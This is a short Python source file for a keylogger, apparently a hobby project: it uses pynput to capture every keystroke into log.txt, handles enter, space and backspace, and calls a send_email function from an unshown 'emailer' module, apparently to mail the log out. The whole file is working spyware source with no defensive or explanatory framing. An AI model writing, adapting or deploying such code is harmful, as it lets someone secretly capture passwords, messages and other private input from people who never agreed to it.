from pynput.keyboard import Key, Listener
import os
from emailer import send_email
import sched
import time
import threading

with open("log.txt", "a") as f:
            f.write("Keylogger")
send_email()

def writefile(key):
    key = str(key)
    key = key.replace("'", "")
    key = key.replace("Key.enter", "\n")
    key = key.replace("Key.space", " ")
    if key == "Key.backspace":
        with open("log.txt", "rb+") as f:
            f.seek(-1, os.SEEK_END)
            f.truncate()
    else:
        with open("log.txt", "a") as f:
            f.write(key)

def onpress(key):
    writefile(key)


def onrelease(key):
    pass

with Listener(on_press=onpress, on_release=onrelease) as listener:
    listener.join()

